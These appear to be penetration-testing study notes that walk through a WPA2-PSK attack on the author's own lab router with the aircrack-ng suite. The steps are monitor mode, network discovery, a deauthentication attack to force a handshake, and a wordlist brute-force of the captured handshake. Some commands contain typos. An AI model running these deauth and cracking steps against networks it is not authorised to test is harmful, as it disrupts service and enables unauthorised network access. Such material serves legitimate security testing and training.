## Wireless Penetration Testing Overview

Two WPA2 :
- PSK : personal, password typed at home
- Enterprise : Use Radius for more advanced environment

We will try to evaluate strengh of PSK, review nearby network, check network access.

We will use a wireless Card (Alfa AWUD036NH), a router (TP-link AC2300 Wireless) and a laptop. Make sure to check compatibility and that is 2.4GHz-5GHz

Workflow :
1) Place : set wireless card in monitor mode
2) Discover : information about the network (channel, bssid)
3) Select : network and capture network
4) Perform : deauth attack
5) Capture : WPA hanshake
6) Attempt : crack handshake


## WPA PS2 Exploit Walkthrough

Connect wireless card, then iwconfig to set monitor mode on it

airmon-ng check kill //check processes that are running and kill them
airmong-ng start wlan0 // restart interface in monitor mode
iwconfig //check monitor mode
airodump-ng wlan0mon //search the area around us to look for information

PWR, the lower the value, the closer we are -1 is closer than -11

airodump-ng -c 6 --bssid 50:c7:bf:8a:00:73 -w capture wlanmon
-c marked channel

We will perform a deauth attack to force a new handshake connection to capture.
Alongside from running latest command :
aireplay-ng -0 1 -a 50:c7:bf:8a:00:73 -c $STATION_ID wlan0mon // replace 50:c7:bf:8a:00:73 with current BSSID
-0 deauth

Close capture and brute-force it
aircrack-ng -w wordlist.txt 50:c7:bf:8a:00:73 capture-02.cap